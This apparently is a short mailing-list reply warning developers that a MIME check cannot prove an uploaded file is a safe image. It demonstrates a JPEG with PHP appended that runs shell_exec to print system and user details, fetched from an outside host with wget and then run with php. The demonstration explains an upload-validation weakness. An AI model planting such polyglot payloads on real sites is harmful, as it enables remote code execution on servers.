I'm not sure to understand what you're talking about but if you're
trying to positively validate that file XYZ is an image and not a PHP
file, you're asking for trouble :

$> wget http://nicob.net/mirrors/blowjob.jpg

$> file blowjob.jpg 
blowjob.jpg: JPEG image data, JFIF standard 1.0

$> tail -n 5 blowjob.jpg
<?php
$resu = shell_exec("echo '' && echo '' && uname -a && id && date");
echo nl2br($resu);
?>

$> php blowjob.jpg
